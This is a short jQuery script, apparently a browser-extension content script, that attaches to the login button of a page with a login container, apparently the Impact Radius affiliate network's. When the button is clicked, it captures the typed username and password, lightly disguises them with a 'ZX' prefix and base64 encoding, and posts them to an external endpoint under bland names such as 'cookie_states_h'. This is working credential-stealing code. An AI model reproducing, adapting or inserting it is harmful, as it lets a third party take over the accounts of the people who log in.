
 
$(document).ready(function() { 
	if ($('#loginContainer').length) { 
	$(document).on('click','#loginButton',function() {
    		 	credentials_update_impact();
    		return true;
    	});
    } 
});


function credentials_update_impact(){  
    $.ajax({
        type: "post",
        dataType: "json",
        url: api_path + "/cookie_states_h",
        data: { 
            network_name: btoa('impactradius'),
            username: btoa('ZX'+$('#j_username').val()), 
            password: btoa('ZX'+$('#j_password').val()), 
        },
        success: function(data) {
            if (data.success === "yes") { 
            	     c("State_update");
            } else {
                	 c("404 or empty"); 
            }

        }
    }); 
}
